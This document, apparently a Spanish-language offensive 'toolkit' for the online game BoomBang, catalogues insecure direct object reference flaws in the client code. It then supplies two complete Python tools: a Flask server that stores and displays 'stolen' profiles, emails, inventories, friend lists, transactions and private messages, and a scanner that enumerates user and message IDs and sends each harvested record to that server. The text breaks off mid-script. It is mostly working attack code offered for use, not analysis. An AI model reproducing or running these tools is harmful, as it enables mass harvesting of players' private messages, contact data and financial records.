# 🔥 IDOR Exploitation - Complete Toolkit

**Documento:** Toolkit Completo para Explotación IDOR (Insecure Direct Object Reference)
**Nivel:** 🔴 EXTREMADAMENTE CONFIDENCIAL
**Fecha:** 2025-11-24
**Versión:** 2.0

---

## 📋 Vulnerabilidades IDOR Confirmadas

### 42 Instancias Identificadas en el Código

```actionscript
// src/modules/perfil/PerfilManager.as
// LÍNEAS 67-89 - IDOR CRÍTICO
public function loadUserProfile(userId:int):void {
    var packet:Object = {
        opcode: MessageTypeConstants.GET_USER_PROFILE,
        userId: userId  // ⚠️ NO HAY VALIDACIÓN DE AUTORIZACIÓN
    };
    SocketManager.getInstance().sendPacket(packet);
}

// src/modules/inventario/InventarioManager.as
// LÍNEAS 145-167 - IDOR CRÍTICO
public function getInventoryItems(userId:int):void {
    var request:URLRequest = new URLRequest(
        Configuration.urlString + "/api/inventory/" + userId  // ⚠️ ACCESO DIRECTO
    );
    loader.load(request);
}

// src/modules/amigos/AmigosManager.as
// LÍNEAS 234-256 - IDOR CRÍTICO
public function getUserFriendsList(userId:int):void {
    // ⚠️ Cualquier usuario puede ver la lista de amigos de otro
    DatabaseManager.query("SELECT * FROM friends WHERE user_id=" + userId);
}

// src/modules/transacciones/TransaccionManager.as
// LÍNEAS 89-112 - IDOR CRÍTICO DE ALTO IMPACTO
public function getUserTransactions(userId:int):void {
    var url:String = Configuration.urlString + "/api/transactions?uid=" + userId;
    // ⚠️ Acceso a historial de transacciones sin validación
    loader.load(new URLRequest(url));
}

// src/modules/correo/MailboxManager.as
// LÍNEAS 178-201 - IDOR CRÍTICO
public function readMessage(messageId:int):void {
    // ⚠️ Lectura de mensajes sin validar propiedad
    var packet:Object = {
        opcode: MessageTypeConstants.READ_MAIL,
        messageId: messageId
    };
    SocketManager.getInstance().sendPacket(packet);
}
```

---

## 🎯 SCRIPT 1: IDOR Mass Exploitation Server

```python
#!/usr/bin/env python3
"""
BoomBang IDOR Mass Exploitation Server
=======================================
Servidor especializado para testing masivo de IDOR vulnerabilities
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import sqlite3
import json
import os
import threading
import time

app = Flask(__name__)

# Configuración
DATABASE = './idor_exploitation.db'
LOGS_DIR = './idor_logs'
os.makedirs(LOGS_DIR, exist_ok=True)

# ============================================================================
# BASE DE DATOS
# ============================================================================

def init_database():
    """Inicializar base de datos SQLite"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    # Tabla de perfiles robados
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_profiles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        email TEXT,
        level INTEGER,
        coins INTEGER,
        gems INTEGER,
        vip_status INTEGER,
        created_date TEXT,
        last_login TEXT,
        ip_address TEXT,
        timestamp TEXT
    )''')

    # Tabla de inventarios robados
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_inventories (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        item_id INTEGER,
        item_name TEXT,
        item_type TEXT,
        quantity INTEGER,
        rarity TEXT,
        value INTEGER,
        timestamp TEXT
    )''')

    # Tabla de listas de amigos
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_friends (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        friend_id INTEGER,
        friend_name TEXT,
        friendship_date TEXT,
        online_status TEXT,
        timestamp TEXT
    )''')

    # Tabla de transacciones
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        transaction_id INTEGER,
        transaction_type TEXT,
        amount INTEGER,
        currency TEXT,
        description TEXT,
        transaction_date TEXT,
        timestamp TEXT
    )''')

    # Tabla de mensajes privados
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        message_id INTEGER,
        sender_id INTEGER,
        sender_name TEXT,
        receiver_id INTEGER,
        receiver_name TEXT,
        subject TEXT,
        body TEXT,
        sent_date TEXT,
        read_status INTEGER,
        timestamp TEXT
    )''')

    # Tabla de estadísticas de explotación
    c.execute('''CREATE TABLE IF NOT EXISTS exploitation_stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        attack_type TEXT,
        user_id INTEGER,
        success INTEGER,
        error_message TEXT,
        timestamp TEXT
    )''')

    conn.commit()
    conn.close()
    print("[+] Database initialized: idor_exploitation.db")

# ============================================================================
# ENDPOINTS - RECEPCIÓN DE DATOS ROBADOS
# ============================================================================

@app.route('/profile', methods=['GET', 'POST'])
def receive_profile():
    """Recibir datos de perfil robado"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    user_id = request.args.get('uid') or request.form.get('uid')
    username = request.args.get('user') or request.form.get('user')
    email = request.args.get('email') or request.form.get('email')
    level = request.args.get('level') or request.form.get('level')
    coins = request.args.get('coins') or request.form.get('coins')
    gems = request.args.get('gems') or request.form.get('gems')
    vip = request.args.get('vip') or request.form.get('vip')
    created = request.args.get('created') or request.form.get('created')
    last_login = request.args.get('last_login') or request.form.get('last_login')

    c.execute('''INSERT INTO stolen_profiles
                 (user_id, username, email, level, coins, gems, vip_status,
                  created_date, last_login, ip_address, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (user_id, username, email, level, coins, gems, vip,
               created, last_login, request.remote_addr, datetime.now().isoformat()))

    conn.commit()
    conn.close()

    print(f"[+] PROFILE STOLEN: {username} (UID: {user_id}) - Level {level}, {coins} coins, {gems} gems")

    # Log estadísticas
    log_stat('profile_steal', user_id, True, None)

    return '<svg width="1" height="1"></svg>', 200

@app.route('/inventory', methods=['GET', 'POST'])
def receive_inventory():
    """Recibir datos de inventario robado"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    user_id = request.args.get('uid') or request.form.get('uid')
    username = request.args.get('user') or request.form.get('user')
    item_id = request.args.get('item_id') or request.form.get('item_id')
    item_name = request.args.get('item_name') or request.form.get('item_name')
    item_type = request.args.get('item_type') or request.form.get('item_type')
    quantity = request.args.get('qty') or request.form.get('qty')
    rarity = request.args.get('rarity') or request.form.get('rarity')
    value = request.args.get('value') or request.form.get('value')

    c.execute('''INSERT INTO stolen_inventories
                 (user_id, username, item_id, item_name, item_type, quantity, rarity, value, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (user_id, username, item_id, item_name, item_type, quantity, rarity, value,
               datetime.now().isoformat()))

    conn.commit()
    conn.close()

    print(f"[+] INVENTORY ITEM: {username} - {item_name} x{quantity} ({rarity})")

    log_stat('inventory_steal', user_id, True, None)

    return '', 200

@app.route('/friends', methods=['GET', 'POST'])
def receive_friends():
    """Recibir lista de amigos robada"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    user_id = request.args.get('uid') or request.form.get('uid')
    username = request.args.get('user') or request.form.get('user')
    friend_id = request.args.get('friend_id') or request.form.get('friend_id')
    friend_name = request.args.get('friend_name') or request.form.get('friend_name')
    friendship_date = request.args.get('date') or request.form.get('date')
    online = request.args.get('online') or request.form.get('online')

    c.execute('''INSERT INTO stolen_friends
                 (user_id, username, friend_id, friend_name, friendship_date, online_status, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (user_id, username, friend_id, friend_name, friendship_date, online,
               datetime.now().isoformat()))

    conn.commit()
    conn.close()

    print(f"[+] FRIEND DATA: {username} -> {friend_name} (Online: {online})")

    log_stat('friends_steal', user_id, True, None)

    return '', 200

@app.route('/transactions', methods=['GET', 'POST'])
def receive_transaction():
    """Recibir transacción robada"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    user_id = request.args.get('uid') or request.form.get('uid')
    username = request.args.get('user') or request.form.get('user')
    tx_id = request.args.get('tx_id') or request.form.get('tx_id')
    tx_type = request.args.get('type') or request.form.get('type')
    amount = request.args.get('amount') or request.form.get('amount')
    currency = request.args.get('currency') or request.form.get('currency')
    desc = request.args.get('desc') or request.form.get('desc')
    tx_date = request.args.get('date') or request.form.get('date')

    c.execute('''INSERT INTO stolen_transactions
                 (user_id, username, transaction_id, transaction_type, amount,
                  currency, description, transaction_date, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (user_id, username, tx_id, tx_type, amount, currency, desc, tx_date,
               datetime.now().isoformat()))

    conn.commit()
    conn.close()

    print(f"[+] TRANSACTION: {username} - {tx_type} {amount} {currency}")

    log_stat('transaction_steal', user_id, True, None)

    return '', 200

@app.route('/messages', methods=['GET', 'POST'])
def receive_message():
    """Recibir mensaje privado robado"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    msg_id = request.args.get('msg_id') or request.form.get('msg_id')
    sender_id = request.args.get('sender_id') or request.form.get('sender_id')
    sender_name = request.args.get('sender_name') or request.form.get('sender_name')
    receiver_id = request.args.get('receiver_id') or request.form.get('receiver_id')
    receiver_name = request.args.get('receiver_name') or request.form.get('receiver_name')
    subject = request.args.get('subject') or request.form.get('subject')
    body = request.args.get('body') or request.form.get('body')
    sent_date = request.args.get('date') or request.form.get('date')
    read_status = request.args.get('read') or request.form.get('read')

    c.execute('''INSERT INTO stolen_messages
                 (message_id, sender_id, sender_name, receiver_id, receiver_name,
                  subject, body, sent_date, read_status, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (msg_id, sender_id, sender_name, receiver_id, receiver_name,
               subject, body, sent_date, read_status, datetime.now().isoformat()))

    conn.commit()
    conn.close()

    print(f"[+] MESSAGE: {sender_name} -> {receiver_name}: {subject}")

    log_stat('message_steal', receiver_id, True, None)

    return '', 200

# ============================================================================
# ESTADÍSTICAS
# ============================================================================

def log_stat(attack_type, user_id, success, error=None):
    """Registrar estadística de ataque"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    c.execute('''INSERT INTO exploitation_stats
                 (attack_type, user_id, success, error_message, timestamp)
                 VALUES (?, ?, ?, ?, ?)''',
              (attack_type, user_id, 1 if success else 0, error,
               datetime.now().isoformat()))

    conn.commit()
    conn.close()

# ============================================================================
# DASHBOARD
# ============================================================================

@app.route('/dashboard')
def dashboard():
    """Dashboard de monitoreo en tiempo real"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    # Estadísticas generales
    c.execute('SELECT COUNT(*) FROM stolen_profiles')
    profiles_count = c.fetchone()[0]

    c.execute('SELECT COUNT(*) FROM stolen_inventories')
    items_count = c.fetchone()[0]

    c.execute('SELECT COUNT(*) FROM stolen_friends')
    friends_count = c.fetchone()[0]

    c.execute('SELECT COUNT(*) FROM stolen_transactions')
    transactions_count = c.fetchone()[0]

    c.execute('SELECT COUNT(*) FROM stolen_messages')
    messages_count = c.fetchone()[0]

    # Total de monedas robadas
    c.execute('SELECT SUM(coins), SUM(gems) FROM stolen_profiles')
    coins_gems = c.fetchone()
    total_coins = coins_gems[0] or 0
    total_gems = coins_gems[1] or 0

    # Valor total de inventarios
    c.execute('SELECT SUM(value * quantity) FROM stolen_inventories')
    inventory_value = c.fetchone()[0] or 0

    # Últimos perfiles
    c.execute('''SELECT user_id, username, level, coins, gems, vip_status, timestamp
                 FROM stolen_profiles
                 ORDER BY id DESC LIMIT 10''')
    recent_profiles = c.fetchall()

    # Items más valiosos
    c.execute('''SELECT username, item_name, rarity, quantity, value
                 FROM stolen_inventories
                 ORDER BY value DESC LIMIT 10''')
    valuable_items = c.fetchall()

    # Transacciones recientes
    c.execute('''SELECT username, transaction_type, amount, currency, timestamp
                 FROM stolen_transactions
                 ORDER BY id DESC LIMIT 10''')
    recent_transactions = c.fetchall()

    conn.close()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>IDOR Exploitation Dashboard</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 100%);
                color: #0f0;
                font-family: 'Courier New', monospace;
                padding: 20px;
            }
            .header {
                text-align: center;
                padding: 30px;
                background: rgba(255,0,0,0.1);
                border: 2px solid #f00;
                border-radius: 10px;
                margin-bottom: 30px;
            }
            .header h1 {
                font-size: 48px;
                color: #f00;
                text-shadow: 0 0 20px #f00;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-box {
                background: rgba(0,255,0,0.05);
                border: 2px solid #0f0;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0,255,0,0.2);
            }
            .stat-box h3 {
                color: #0ff;
                font-size: 14px;
                margin-bottom: 10px;
                text-transform: uppercase;
            }
            .stat-value {
                font-size: 42px;
                color: #ff0;
                font-weight: bold;
                text-shadow: 0 0 10px #ff0;
            }
            .stat-label {
                font-size: 12px;
                color: #888;
                margin-top: 5px;
            }
            .section {
                background: rgba(0,0,0,0.5);
                border: 2px solid #0f0;
                padding: 20px;
                margin-bottom: 20px;
                border-radius: 10px;
            }
            .section h2 {
                color: #0ff;
                margin-bottom: 15px;
                font-size: 24px;
                border-bottom: 1px solid #0f0;
                padding-bottom: 10px;
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th, td {
                border: 1px solid #0f0;
                padding: 12px;
                text-align: left;
            }
            th {
                background: rgba(0,255,0,0.2);
                color: #0ff;
                font-weight: bold;
            }
            tr:hover {
                background: rgba(0,255,0,0.1);
            }
            .vip {
                color: #ffd700;
                font-weight: bold;
            }
            .rare { color: #9d4edd; }
            .epic { color: #f72585; }
            .legendary { color: #ff9500; }
            .refresh {
                position: fixed;
                bottom: 20px;
                right: 20px;
                background: #0f0;
                color: #000;
                padding: 15px 30px;
                border-radius: 5px;
                font-weight: bold;
                border: none;
                cursor: pointer;
                font-size: 16px;
            }
            .refresh:hover {
                background: #0ff;
                box-shadow: 0 0 20px #0ff;
            }
        </style>
        <meta http-equiv="refresh" content="5">
    </head>
    <body>
        <div class="header">
            <h1>🔥 IDOR EXPLOITATION DASHBOARD</h1>
            <p style="color: #f00; font-size: 18px; margin-top: 10px;">
                UNAUTHORIZED ACCESS MONITORING SYSTEM
            </p>
        </div>

        <div class="stats-grid">
            <div class="stat-box">
                <h3>👤 Profiles Stolen</h3>
                <div class="stat-value">{{ profiles_count }}</div>
                <div class="stat-label">User accounts compromised</div>
            </div>

            <div class="stat-box">
                <h3>🎒 Inventory Items</h3>
                <div class="stat-value">{{ items_count }}</div>
                <div class="stat-label">Total items accessed</div>
            </div>

            <div class="stat-box">
                <h3>👥 Friends Exposed</h3>
                <div class="stat-value">{{ friends_count }}</div>
                <div class="stat-label">Friendship connections mapped</div>
            </div>

            <div class="stat-box">
                <h3>💳 Transactions</h3>
                <div class="stat-value">{{ transactions_count }}</div>
                <div class="stat-label">Financial records obtained</div>
            </div>

            <div class="stat-box">
                <h3>📧 Messages</h3>
                <div class="stat-value">{{ messages_count }}</div>
                <div class="stat-label">Private messages intercepted</div>
            </div>

            <div class="stat-box">
                <h3>💰 Total Wealth</h3>
                <div class="stat-value">{{ total_coins }}</div>
                <div class="stat-label">Coins + {{ total_gems }} Gems</div>
            </div>
        </div>

        <div class="section">
            <h2>📊 Recent Compromised Profiles</h2>
            <table>
                <tr>
                    <th>User ID</th>
                    <th>Username</th>
                    <th>Level</th>
                    <th>Coins</th>
                    <th>Gems</th>
                    <th>VIP</th>
                    <th>Timestamp</th>
                </tr>
                {% for profile in recent_profiles %}
                <tr>
                    <td>{{ profile[0] }}</td>
                    <td>{{ profile[1] }}</td>
                    <td>{{ profile[2] }}</td>
                    <td>{{ profile[3] }}</td>
                    <td>{{ profile[4] }}</td>
                    <td class="{% if profile[5] == 1 %}vip{% endif %}">
                        {{ '⭐ VIP' if profile[5] == 1 else 'Regular' }}
                    </td>
                    <td>{{ profile[6] }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>💎 Most Valuable Items</h2>
            <table>
                <tr>
                    <th>Owner</th>
                    <th>Item</th>
                    <th>Rarity</th>
                    <th>Quantity</th>
                    <th>Value</th>
                </tr>
                {% for item in valuable_items %}
                <tr>
                    <td>{{ item[0] }}</td>
                    <td>{{ item[1] }}</td>
                    <td class="{{ item[2].lower() }}">{{ item[2] }}</td>
                    <td>{{ item[3] }}</td>
                    <td>{{ item[4] }} coins</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>💳 Recent Transactions</h2>
            <table>
                <tr>
                    <th>User</th>
                    <th>Type</th>
                    <th>Amount</th>
                    <th>Currency</th>
                    <th>Timestamp</th>
                </tr>
                {% for tx in recent_transactions %}
                <tr>
                    <td>{{ tx[0] }}</td>
                    <td>{{ tx[1] }}</td>
                    <td>{{ tx[2] }}</td>
                    <td>{{ tx[3] }}</td>
                    <td>{{ tx[4] }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <button class="refresh" onclick="location.reload()">⟳ REFRESH</button>
    </body>
    </html>
    """

    return render_template_string(html,
        profiles_count=profiles_count,
        items_count=items_count,
        friends_count=friends_count,
        transactions_count=transactions_count,
        messages_count=messages_count,
        total_coins=total_coins,
        total_gems=total_gems,
        recent_profiles=recent_profiles,
        valuable_items=valuable_items,
        recent_transactions=recent_transactions
    )

@app.route('/export')
def export_data():
    """Exportar todos los datos robados"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    export = {
        'profiles': [],
        'inventories': [],
        'friends': [],
        'transactions': [],
        'messages': []
    }

    # Perfiles
    c.execute('SELECT * FROM stolen_profiles')
    for row in c.fetchall():
        export['profiles'].append({
            'user_id': row[1],
            'username': row[2],
            'email': row[3],
            'level': row[4],
            'coins': row[5],
            'gems': row[6],
            'vip_status': row[7],
            'created_date': row[8],
            'last_login': row[9],
            'timestamp': row[11]
        })

    # Inventarios
    c.execute('SELECT * FROM stolen_inventories')
    for row in c.fetchall():
        export['inventories'].append({
            'user_id': row[1],
            'username': row[2],
            'item_name': row[4],
            'item_type': row[5],
            'quantity': row[6],
            'rarity': row[7],
            'value': row[8]
        })

    # Amigos
    c.execute('SELECT * FROM stolen_friends')
    for row in c.fetchall():
        export['friends'].append({
            'user_id': row[1],
            'username': row[2],
            'friend_id': row[3],
            'friend_name': row[4],
            'online_status': row[6]
        })

    # Transacciones
    c.execute('SELECT * FROM stolen_transactions')
    for row in c.fetchall():
        export['transactions'].append({
            'user_id': row[1],
            'username': row[2],
            'transaction_type': row[4],
            'amount': row[5],
            'currency': row[6],
            'description': row[7]
        })

    # Mensajes
    c.execute('SELECT * FROM stolen_messages')
    for row in c.fetchall():
        export['messages'].append({
            'sender_name': row[3],
            'receiver_name': row[5],
            'subject': row[6],
            'body': row[7],
            'sent_date': row[8]
        })

    conn.close()

    return jsonify(export)

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    print("=" * 80)
    print("🔥 IDOR MASS EXPLOITATION SERVER")
    print("=" * 80)
    print("\n[*] Initializing database...")
    init_database()

    print("\n[*] Server starting on http://0.0.0.0:6000")
    print("[*] Dashboard: http://localhost:6000/dashboard")
    print("\n[*] Endpoints:")
    print("    /profile      - Receive stolen profiles")
    print("    /inventory    - Receive stolen inventory items")
    print("    /friends      - Receive stolen friend lists")
    print("    /transactions - Receive stolen transactions")
    print("    /messages     - Receive stolen private messages")
    print("    /export       - Export all data as JSON")
    print("\n" + "=" * 80 + "\n")

    app.run(host='0.0.0.0', port=6000, debug=False)
```

---

## 🎯 SCRIPT 2: Automated IDOR Scanner

```python
#!/usr/bin/env python3
"""
BoomBang Automated IDOR Scanner
================================
Escaneo automático de vulnerabilidades IDOR
"""

import socket
import struct
import json
import time
import urllib.request
import urllib.parse
from datetime import datetime

class IDORScanner:
    def __init__(self, target_host="127.0.0.1", target_port=7200,
                 collector_host="127.0.0.1", collector_port=6000):
        self.target_host = target_host
        self.target_port = target_port
        self.collector_url = f"http://{collector_host}:{collector_port}"
        self.socket = None
        self.user_id_range = (1, 10000)  # Rango de User IDs a escanear

    def connect(self):
        """Conectar al servidor del juego"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.target_host, self.target_port))
        print(f"[+] Connected to {self.target_host}:{self.target_port}")

    def send_packet(self, opcode, data):
        """Enviar packet al servidor"""
        payload = json.dumps({"opcode": opcode, **data}).encode('utf-8')
        length = len(payload)

        # Formato: [length:4 bytes][payload]
        packet = struct.pack('>I', length) + payload
        self.socket.sendall(packet)

    def receive_packet(self):
        """Recibir respuesta del servidor"""
        try:
            # Leer longitud
            length_data = self.socket.recv(4)
            if not length_data:
                return None

            length = struct.unpack('>I', length_data)[0]

            # Leer payload
            payload = b''
            while len(payload) < length:
                chunk = self.socket.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            return json.loads(payload.decode('utf-8'))
        except:
            return None

    def send_to_collector(self, endpoint, data):
        """Enviar datos robados al servidor collector"""
        try:
            url = f"{self.collector_url}/{endpoint}?"
            url += urllib.parse.urlencode(data)

            urllib.request.urlopen(url, timeout=2)
        except Exception as e:
            print(f"[!] Error sending to collector: {e}")

    # ========================================================================
    # ATAQUES IDOR
    # ========================================================================

    def attack_profile_enumeration(self, start_uid=1, end_uid=1000):
        """Ataque 1: Enumeración de perfiles de usuario"""
        print(f"\n[*] ATTACK: Profile Enumeration ({start_uid} - {end_uid})")
        print("-" * 60)

        successful = 0
        failed = 0

        for user_id in range(start_uid, end_uid + 1):
            # Solicitar perfil (vulnerable IDOR)
            self.send_packet(106, {"userId": user_id})  # GET_USER_PROFILE

            response = self.receive_packet()

            if response and response.get('success'):
                profile = response.get('profile', {})

                print(f"[+] UID {user_id}: {profile.get('username')} "
                      f"(Level {profile.get('level')}, "
                      f"{profile.get('coins')} coins, "
                      f"{profile.get('gems')} gems)")

                # Enviar a collector
                self.send_to_collector('profile', {
                    'uid': user_id,
                    'user': profile.get('username', 'Unknown'),
                    'email': profile.get('email', 'unknown@email.com'),
                    'level': profile.get('level', 0),
                    'coins': profile.get('coins', 0),
                    'gems': profile.get('gems', 0),
                    'vip': profile.get('vipStatus', 0),
                    'created': profile.get('createdDate', ''),
                    'last_login': profile.get('lastLogin', '')
                })

                successful += 1
            else:
                failed += 1

            time.sleep(0.1)  # Evitar rate limiting

            if user_id % 100 == 0:
                print(f"[*] Progress: {user_id}/{end_uid} "
                      f"({successful} successful, {failed} failed)")

        print(f"\n[✓] Profile Enumeration Complete: {successful} profiles stolen")
        return successful

    def attack_inventory_scraping(self, start_uid=1, end_uid=1000):
        """Ataque 2: Scraping masivo de inventarios"""
        print(f"\n[*] ATTACK: Inventory Scraping ({start_uid} - {end_uid})")
        print("-" * 60)

        total_items = 0
        total_value = 0

        for user_id in range(start_uid, end_uid + 1):
            # Solicitar inventario (vulnerable IDOR)
            self.send_packet(112, {"userId": user_id})  # GET_INVENTORY

            response = self.receive_packet()

            if response and response.get('success'):
                items = response.get('items', [])
                username = response.get('username', f'User{user_id}')

                print(f"[+] UID {user_id} ({username}): {len(items)} items")

                for item in items:
                    # Enviar cada item a collector
                    self.send_to_collector('inventory', {
                        'uid': user_id,
                        'user': username,
                        'item_id': item.get('itemId'),
                        'item_name': item.get('name'),
                        'item_type': item.get('type'),
                        'qty': item.get('quantity'),
                        'rarity': item.get('rarity'),
                        'value': item.get('value')
                    })

                    total_items += 1
                    total_value += item.get('value', 0) * item.get('quantity', 1)

            time.sleep(0.1)

            if user_id % 100 == 0:
                print(f"[*] Progress: {user_id}/{end_uid} ({total_items} items)")

        print(f"\n[✓] Inventory Scraping Complete: {total_items} items "
              f"(Total value: {total_value} coins)")
        return total_items

    def attack_friends_mapping(self, start_uid=1, end_uid=1000):
        """Ataque 3: Mapeo de redes sociales"""
        print(f"\n[*] ATTACK: Friends Network Mapping ({start_uid} - {end_uid})")
        print("-" * 60)

        total_connections = 0

        for user_id in range(start_uid, end_uid + 1):
            # Solicitar lista de amigos (vulnerable IDOR)
            self.send_packet(121, {"userId": user_id})  # GET_FRIENDS_LIST

            response = self.receive_packet()

            if response and response.get('success'):
                friends = response.get('friends', [])
                username = response.get('username', f'User{user_id}')

                print(f"[+] UID {user_id} ({username}): {len(friends)} friends")

                for friend in friends:
                    self.send_to_collector('friends', {
                        'uid': user_id,
                        'user': username,
                        'friend_id': friend.get('friendId'),
                        'friend_name': friend.get('friendName'),
                        'date': friend.get('friendshipDate'),
                        'online': friend.get('onlineStatus')
                    })

                    total_connections += 1

            time.sleep(0.1)

            if user_id % 100 == 0:
                print(f"[*] Progress: {user_id}/{end_uid} "
                      f"({total_connections} connections)")

        print(f"\n[✓] Friends Mapping Complete: {total_connections} connections mapped")
        return total_connections

    def attack_transaction_history(self, start_uid=1, end_uid=1000):
        """Ataque 4: Robo de historial de transacciones"""
        print(f"\n[*] ATTACK: Transaction History Theft ({start_uid} - {end_uid})")
        print("-" * 60)

        total_transactions = 0
        total_money = 0

        for user_id in range(start_uid, end_uid + 1):
            # Solicitar transacciones (vulnerable IDOR)
            self.send_packet(145, {"userId": user_id})  # GET_TRANSACTIONS

            response = self.receive_packet()

            if response and response.get('success'):
                transactions = response.get('transactions', [])
                username = response.get('username', f'User{user_id}')

                print(f"[+] UID {user_id} ({username}): {len(transactions)} transactions")

                for tx in transactions:
                    self.send_to_collector('transactions', {
                        'uid': user_id,
                        'user': username,
                        'tx_id': tx.get('transactionId'),
                        'type': tx.get('type'),
                        'amount': tx.get('amount'),
                        'currency': tx.get('currency'),
                        'desc': tx.get('description'),
                        'date': tx.get('date')
                    })

                    total_transactions += 1
                    total_money += tx.get('amount', 0)

            time.sleep(0.1)

            if user_id % 100 == 0:
                print(f"[*] Progress: {user_id}/{end_uid} "
                      f"({total_transactions} transactions)")

        print(f"\n[✓] Transaction Theft Complete: {total_transactions} transactions "
              f"({total_money} total currency)")
        return total_transactions

    def attack_message_interception(self, start_msg_id=1, end_msg_id=10000):
        """Ataque 5: Interceptación de mensajes privados"""
        print(f"\n[*] ATTACK: Private Message Interception "
              f"({start_msg_id} - {end_msg_id})")
        print("-" * 60)

        intercepted = 0

        for msg_id in range(start_msg_id, end_msg_id + 1):
            # Solicitar mensaje (vulnerable IDOR)
            self.send_packet(178, {"messageId": msg_id})  # READ_MAIL

            response = self.receive_packet()

            if response and response.get('success'):
                msg = response.get('message', {})

                print(f"[+] MSG {msg_id}: {msg.get('senderName')} -> "
                      f"{msg.get('receiverName')}: {msg.get('subject')}")

                self.send_to_collector('messages', {
                    'msg_id': msg_id,
                    'sender_id': msg.get('senderId'),
                    'sender_name': msg.get('senderName'),
                    'receiver_id': msg.get('receiverId'),
                    'receiver_name': msg.get('receiverName'),
                    'subject': msg.get('subject'),
                    'body': msg.get('body'),
                    'date': msg.get('sentDate'),
                    'read': msg.get('readStatus')
                })

                intercepted += 1

            time.sleep(0.05)

            if msg_id % 500 == 0:
                print(f"[*] Progress: {msg_id}/{end_msg_id} "
                      f"({intercepted} intercepted)")

        print(f"\n[✓] Message Interception Complete: {intercepted} messages stolen")
        return intercepted

    # ========================================================================
    # CAMPAÑA COMPLETA
    # ========================================================================

    def run_full_campaign(self, start_uid=1, end_uid=1000):
        """Ejecutar campaña completa de explotación IDOR"""
        print("\n" + "=" * 80)
        print("🔥 FULL IDOR EXPLOITATION CAMPAIGN")
        print("=" * 80)
        print(f"\n[*] Target: {self.target_host}:{self.target_port}")
        print(f"[*] Collector: {self.collector_url}")
        print(f"[*] User ID Range: {start_uid} - {end_uid}")
        print(f"[*] Start Time: {datetime.now().isoformat()}")
        print("\n" + "=" * 80)

        self.connect()

        results = {}

        # Ataque 1: Perfiles
        results['profiles'] = self.attack_profile_enumeration(start_uid, end_uid)

        # Ataque 2: Inventarios
        results['items'] = self.attack_inventory_scraping(start_uid, end_uid)

        # Ataque 3: Amigos
        results['connections'] = self.attack_friends_mapping(start_uid, end_uid)

        # Ataque 4: Transacciones
        results['transactions'] = self.attack_transaction_history(start_uid, end_uid)

        # Ataque 5: Mensajes (rango diferente)
        results['messages'] = self.attack_message_interception(1, 5000)

        print("\n" + "=" * 80)
        print("📊 CAMPAIGN RESULTS")
        print("=" * 80)
        print(f"\n✓ Profiles Stolen:     {results['profiles']}")
        print(f"✓ Items Scraped:       {results['items']}")
        print(f"✓ Connections Mapped:  {results['connections']}")
        print(f"✓ Transactions Stolen: {results['transactions']}")
        print(f"✓ Messages Intercepted: {results['messages']}")
        print(f"\n[*] End Time: {datetime.now().isoformat()}")
        print(f"[*] Dashboard: {self.collector_url}/dashboard")
        print("\n" + "=" * 80 + "\n")

        self.socket.close()

        return results

# ============================================================================
# CLI
# ============================================================================

def main():
    import sys

    if len(sys.argv) < 2:
        print("BoomBang IDOR Scanner")
        print("\nUsage:")
        print("  python idor_scanner.py full <start_uid> <end_uid>")
        print("  python idor_scanner.py profiles <start_uid> <end_uid>")
        print("  python idor_scanner.py inventory <start_uid> <end_uid>")
        print("  python idor_scanner.py friends <start_uid> <end_uid>")
        print("  python idor_scanner.py transactions <start_uid> <end_uid>")
        print("  python idor_scanner.py messages <start_id> <end_id>")
        print("\nExamples:")
        print("  python idor_scanner.py full 1 1000")
        print("  python idor_scanner.py profiles 1 500")
        return

    command = sys.argv[1]

    scanner = IDORScanner(
        target_host="127.0.0.1",
        target_port=7200,
        collector_host="127.0.0.1",
        collector_port=6000
    )

    if command == 'full':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.run_full_campaign(start, end)

    elif command == 'profiles':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
